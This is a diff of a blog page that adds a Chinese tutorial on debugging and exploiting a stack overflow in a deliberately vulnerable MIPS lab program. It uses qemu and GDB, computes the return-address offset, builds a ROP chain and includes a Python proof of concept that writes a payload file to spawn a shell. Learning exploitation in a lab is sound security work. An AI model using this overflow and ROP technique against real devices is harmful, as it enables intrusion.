-            <a class="btn" href="/post/36656.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+<p>编译完成后可尝试使用<code>qemu-mipsel</code>验证程序正确性<br><img src="http://file.smilehacker.net/info_1.png" alt="环境介绍"></p>
+<p>从上面图片可以看出,编译产生的程序为一个MIPS程序,在Linux下无法直接运行,生成<code>passwd</code>文件(一个正常的输入文件，并没有造成溢出),使用<code>qemu-mipsel</code>模拟程序获得执行结果。</p>
+<h4 id="使用GDB动态调试程序"><a href="#使用GDB动态调试程序" class="headerlink" title="使用GDB动态调试程序"></a>使用<code>GDB</code>动态调试程序</h4><p>启动<code>qemu</code>远程调试</p>
+<blockquote>
+<p>qemu-mipsel -g 1234 vuln_system</p>
+</blockquote>
+<ul>
+<li>-g 指定<code>qemu-mipsel</code>远程调试端口</li>
+</ul>
+<p>设置<code>gdb</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./vuln_system</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开gdb后进行如下设置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> endian little <span class="comment">#设置小端序</span></span></span><br><span class="line">The target is assumed to be little endian</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> architecture mips <span class="comment">#设置为Mips架构</span></span></span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> target remote localhost:1234 <span class="comment">#设置远程端口</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="http://file.smilehacker.net/Gdbset.png" alt="GDB调试设置"></p>
+<p>现在重新生成<code>passwd</code>文件,使用python向文件中写入600个A</p>
+<blockquote>
+<p>python -c “print ‘A’*600 “&gt; passwd</p>
+</blockquote>
+<p>之后重新用gdb加载程序,直接输入<code>r</code>让程序直接运行。</p>
+<p><img src="http://file.smilehacker.net/info2.png" alt="Alt text"></p>
+<p>可以看到程序直接崩溃，并且崩溃后的<code>PC</code>寄存器指向了<code>0x41414141</code>(A的16进制为0x41)</p>
+<h4 id="劫持执行流程"><a href="#劫持执行流程" class="headerlink" title="劫持执行流程"></a>劫持执行流程</h4><p>从上面可以看到,不仅程序崩溃了,而且完全劫持了函数流程,让<code>PC</code>指针指向0x41414141,现在尝试精准定位，究竟淹没多少个自己可以劫持程序的执行流程。</p>
+<h5 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h5><p>通过静态分析发现,如果要使缓冲区溢出,并控制到堆栈中的返回地址saved_ra,需要覆盖的数据大小应该达到0x1A0-0x04即0x19c字节;作者这里运用这个公式的依据是什么呢?让我们回顾一下X86架构下的情形:</p>
+<p>偏移不就是找buf和ra之间的偏移么,ra是存储于栈里面的(有点类似于x86里面的ret指令),buf指向栈里面,只要计算出buf的初始位置和ra之间的偏移,就可以计算出有多少个字节就可以溢出到ra了！</p>
+<h5 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h5><p><img src="http://file.smilehacker.net/findoffest.png" alt="寻找偏移"></p>
+<figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0</span><br><span class="line">sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为											0x1D0+var_4</span><br><span class="line">sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8</span><br><span class="line">move    $fp, $sp                //fp&lt;== sp</span><br><span class="line">li      $gp, 0x4291A0           //li指令:将一个立即数存放于寄存器里面</span><br><span class="line">sw      $gp, 0x1D0+var_1C0($sp) //将gp里面的值存放于堆栈里面,其偏移为										0x1D0+var_1C0</span><br><span class="line">addiu   $v0, $fp, 0x1D0+var_1A0    //v0用于存放函数函数返回值</span><br><span class="line">li      $v1, 0x100        //将立即数0x100传入v1</span><br><span class="line">move    $a2, $v1          //MIPS架构中一般使用a0-a3作为函数的前4个参数</span><br><span class="line">move    $a1, $zero        //zero寄存器里面永远为0</span><br><span class="line">move    $a0, $v0          //a0=v0</span><br><span class="line">la      $v0, memset      //复制memset地址至至v0中</span><br><span class="line">move    $t9, $v0         //$t0-$t9供汇编程序使用的临时变量</span><br><span class="line">bal     memset           //无条件转移,并且将转移指令后面的第二条地址作为返回值存放								于Ra里面</span><br><span class="line"><span class="keyword">nop</span></span><br></pre></td></tr></table></figure>
+
+<p>结合源代码看,可以发现主函数里面调用的第一个函数为<code>memset</code>函数,但是源代码中没有调用这个函数,发现在调用这个函数之前是调用了3个参数的,分别用到<code>a0</code>,<code>a1</code>,和<code>a2</code>这几个寄存器,而函数<code>memset</code>的原型为<code>void* memset(void* s,int ch,unsigned n)</code>，其主要功能为:在内存空间里以s为起始的地方,将开始的n个字节设为指定值;可以发现传给<code>a2</code>的值为<code>v1</code>,而传给<code>$v1</code>的为<code>0x100</code>(0x100实际上就是十进制256),这里在做的事情是内存初始化,通过这个函数将内存里面的<code>256</code>个字节初始化为<code>0</code>,而这里的内存初始地址是通过指令<code>addiu $v0,$fp,0x1D0+var_1A0</code>来确定的,显然,<code>0x1D0+var_1A0</code>就是我们要找的buf的起始偏移，到这里,我们才能确定:需要覆盖的数据大小应该为<code>0x1D0+var_1A0-0x1D0-var_4</code>即<code>0x19c</code>字节;</p>
+<h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>我们将0x19C以后的数据设置成<code>BBBB</code>(0x42424242),如果我们猜测正确,那程序会被劫持到0x424242处</p>
+<blockquote>
+<p>tt@ubuntu:~$ python -c “print ‘A’*0x19c + ‘BBBB’+’CCCC’”&gt;passwd</p>
+</blockquote>
+<p>接下来使用GDB查看main函数的代码，并在main函数结尾处下断点</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">disassemble main # 查看main函数的汇编代码</span><br><span class="line"></span><br><span class="line">break *main+740 # 在main函数后740行处下断点</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://file.smilehacker.net/gccbreaks.png" alt="汇编下断点"></p>
+<p>断点下好后输入<code>c</code>,让程序运行到刚刚下的断点处</p>
+<p><img src="http://file.smilehacker.net/return.png" alt="继续运行"></p>
+<p>输入<code>n</code>,让函数运行到756行，如果<code>ra</code>被替换成<code>0x42424242</code>,就说明我们的猜想是正确的。</p>
+<p><img src="http://file.smilehacker.net/validate.png" alt="猜想成功"></p>
+<p>可以看到pc的值已经成功被劫持为<code>0x42424242</code>了</p>
+<h4 id="构造ROP-chain"><a href="#构造ROP-chain" class="headerlink" title="构造ROP chain"></a>构造ROP chain</h4><p>一般漏洞攻击的途径有两种:一是命令执行,另外一种方法是执行shellcode;<br>这里只谈命令执行的方法:<br>在源程序里面有一个函数do_system_0.虽然从代码里面可以看出，do_system_0函数只能执行“ls -l”命令,但是我们可以构造一条ROP链,通过溢出漏洞调用这个函数,使得这个函数能够执行任意命令.想要构造出ROP链,首先构造出do_system_0这个函数的两个参数,将两个参数分别 装入寄存器<br>a0和a1,这里只需要控制寄存器$a1即可,该参数是命令的字符串地址</p>
+<p>使用<code>IDA</code>脚本插件<code>mipsrop.py</code>搜索合适的<code>ROP Chain</code></p>
+<p><img src="http://file.smilehacker.net/ROPfinder.png" alt="寻找合适的rop链"></p>
+<p><img src="http://file.smilehacker.net/ROPchain.png" alt="ROP"></p>
+<p>在缓冲区溢出时,直接让<code>ra</code>的值指向<code>0x00401FA0</code>,<strong>因为<code>ROP技术</code>使用的堆栈都是同一个堆栈</strong>，只要让<code>$sp+0x58+var_40</code>的值为想要执行的命令,并且在<code>$sp+0x58+var_4</code>处的值存放成跳转到<code>do_system_0</code>函数的地址(<code>0x00400678</code>),就可以达到目的。</p>
+<p><img src="http://file.smilehacker.net/RAreturn.png" alt="设置RA的值"></p>
+<p>现在整理一下当前栈帧:<br><img src="http://file.smilehacker.net/stackinfo.png" alt="当前栈帧"></p>
+<h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">struct.pack("&lt;L","xxx")为小端序</span></span><br><span class="line"><span class="string">struct.pack("&gt;L","xxx")为大端序</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">"sh"</span> 				<span class="comment"># command string</span></span><br><span class="line">cmd += <span class="string">"\x00"</span>*(<span class="number">4</span> - (len(cmd) % <span class="number">4</span>))	<span class="comment"># align by 4 bytes</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcode = <span class="string">"A"</span>*<span class="number">0x19C</span> 			<span class="comment"># padding buf</span></span><br><span class="line">shellcode += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x00401FA0</span>) </span><br><span class="line">shellcode += <span class="string">"A"</span>*<span class="number">24</span>				<span class="comment"># padding before command</span></span><br><span class="line">shellcode += cmd				<span class="comment"># command($a1)</span></span><br><span class="line">shellcode += <span class="string">"B"</span>*(<span class="number">0x3C</span> - len(cmd))		<span class="comment"># padding </span></span><br><span class="line">shellcode += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x00400678</span>) </span><br><span class="line">shellcode += <span class="string">"BBBB"</span>				<span class="comment"># padding</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">' ok!'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#create password file</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] create password file'</span>,</span><br><span class="line">fw = open(<span class="string">'passwd'</span>,<span class="string">'w'</span>)</span><br><span class="line">fw.write(shellcode)<span class="comment">#'A'*300+'\x00'*10+'BBBB')</span></span><br><span class="line">fw.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">' ok!'</span></span><br></pre></td></tr></table></figure>
+
+<p>将上述代码保存为<code>poc.py</code>,运行结果如下</p>
+<p><img src="http://file.smilehacker.net/result.png" alt="result"></p>
+<p>成功拿到shell</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
+<li><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></li>
+</ul>
+
       
     </div>
     
@@ -1358,14 +535,48 @@
 
     <footer class="post-footer">
       
-
+        <div class="post-tags">
+          
+            <a href="/tags/IoT/" rel="tag"># IoT</a>
+          
+            <a href="/tags/%E8%B0%83%E8%AF%95/" rel="tag"># 调试</a>
+          
+            <a href="/tags/Debug/" rel="tag"># Debug</a>
+          
+            <a href="/tags/Mips/" rel="tag"># Mips</a>
+          
+            <a href="/tags/%E6%BA%A2%E5%87%BA/" rel="tag"># 溢出</a>
+          
+        </div>
       
 
       
+      
+      
 
       
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/25086.html" rel="next" title="GDB调试命令--持续更新">
+                <i class="fa fa-chevron-left"></i> GDB调试命令--持续更新
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/post/64819.html" rel="prev" title="Linux PWN">
+                Linux PWN <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
       
-        <div class="post-eof"></div>
+
+      
       
     </footer>
   </div>
@@ -1375,10 +586,17 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dad56b440a98d03" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
 
 
           </div>
@@ -1386,6 +604,20 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -1406,8 +638,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -1506,6 +747,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用GDB调试MIPS架构的缓冲区溢出"><span class="nav-number">1.</span> <span class="nav-text">使用GDB调试MIPS架构的缓冲区溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#环境介绍和准备工作"><span class="nav-number">2.</span> <span class="nav-text">环境介绍和准备工作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用GDB动态调试程序"><span class="nav-number">3.</span> <span class="nav-text">使用GDB动态调试程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#劫持执行流程"><span class="nav-number">4.</span> <span class="nav-text">劫持执行流程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#计算偏移"><span class="nav-number">4.1.</span> <span class="nav-text">计算偏移</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#寻找偏移"><span class="nav-number">4.2.</span> <span class="nav-text">寻找偏移</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#验证"><span class="nav-number">4.3.</span> <span class="nav-text">验证</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构造ROP-chain"><span class="nav-number">5.</span> <span class="nav-text">构造ROP chain</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#整理POC"><span class="nav-number">6.</span> <span class="nav-text">整理POC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考链接"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1653,6 +910,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -1670,6 +931,18 @@
       <script id="dsq-count-scr" src="https://blog-rvy0h9n8wm.disqus.com/count.js" async></script>
     
 
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://blog.pwntools.xyz/post/43075.html';
+          this.page.identifier = 'post/43075.html';
+          this.page.title = '使用GDB调试MIPS架构的缓冲区溢出';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://blog-rvy0h9n8wm.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
     
 
   
